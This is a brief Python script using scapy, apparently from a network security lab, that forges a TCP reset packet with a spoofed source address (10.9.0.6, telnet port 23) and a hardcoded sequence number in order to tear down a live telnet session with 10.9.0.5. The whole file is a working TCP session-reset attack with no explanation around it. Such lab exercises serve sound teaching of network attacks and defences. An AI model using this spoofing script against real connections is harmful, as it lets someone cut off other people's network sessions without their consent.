from scapy.all import *
from ipaddress import IPv4Address
from random import getrandbits

ip=IP(src='10.9.0.6',dst='10.9.0.5')
tcp=TCP(sport=23,dport=43322,flags='R',seq=2592535282)
pkt=ip/tcp
ls(pkt)
send(pkt, verbose = 0)
	
